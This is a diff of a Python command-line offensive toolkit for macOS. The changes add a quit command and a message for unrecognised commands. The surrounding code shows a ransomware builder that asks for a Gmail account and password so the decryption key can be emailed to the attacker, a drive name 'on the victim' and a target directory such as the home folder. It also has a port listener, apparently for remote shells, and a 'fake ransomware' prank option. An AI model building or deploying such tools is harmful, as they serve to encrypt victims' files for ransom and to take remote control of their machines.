@@ -1,5 +1,6 @@
 from colorama import Fore, Style
 import platform
+import sys
 import os
 
 def infos():
@@ -21,6 +22,7 @@ def help():
     print("FakeRans : generates a fake ransomware that in reality is just renaming files, to troll")
     print("info (or -i) : display software infos")
     print("help (or -h) : show this message duh")
+    print("quit (or -q) : quits program")
     print("clear : clears the screen as it would in an UNIX terminal\n")
     inputline()
 
@@ -34,7 +36,7 @@ def Ransomware():
     email = input(Fore.RED + "(MIS) Input the mail where you want to receive the key to (must be @gmail) /> " + Style.RESET_ALL)
     password = input(Fore.RED + "(MIS) Input the password for that email account (it sends the key to hitself)/> " + Style.RESET_ALL)
     volumename = input(Fore.RED + "(MIS) Input the name you want for the new encrypted drive on the victim /> " + Style.RESET_ALL)
-    dirtoenc = input(Fore.RED + "(MIS) Input the target directory (~/* for the home dir, note: insert in brackets) /> " + Style.RESET_ALL)
+    dirtoenc = input(Fore.RED + "(MIS) Input the target directory (~/* for the home dir) /> " + Style.RESET_ALL)
     print(Fore.GREEN + generating + Style.RESET_ALL)
     filecon = open(filepath, "r")
     messagecontent = filecon.read().replace("\n", "\\n")
@@ -489,6 +491,9 @@ func reverse() {
             os.chdir("..")
             inputline()
 
+def quit():
+    sys.exit("\n"+Fore.LIGHTBLACK_EX + "Ok bye!" + Style.RESET_ALL)
+
 def inputline():
     cmd = input(Fore.RED + "mAc_iS_sECuRe /> " + Style.RESET_ALL)
     if (cmd == "help" or cmd == "-h"):
@@ -507,6 +512,10 @@ def inputline():
         listen()
     elif (cmd == "fakerans" or cmd == "FakeRans" or cmd == "Fakerans"):
         fakerans()
+    elif (cmd == "quit" or cmd == "-q" or cmd == "Quit"):
+        quit()
+    else:
+    	print(Fore.YELLOW + "(MIS) Not able to recognise command, type \"help\" to get a list of commands")
 
 def listen():
 	ipporta = input(Fore.RED + "(MIS) Insert the port you want to listen on /> " + Style.RESET_ALL)
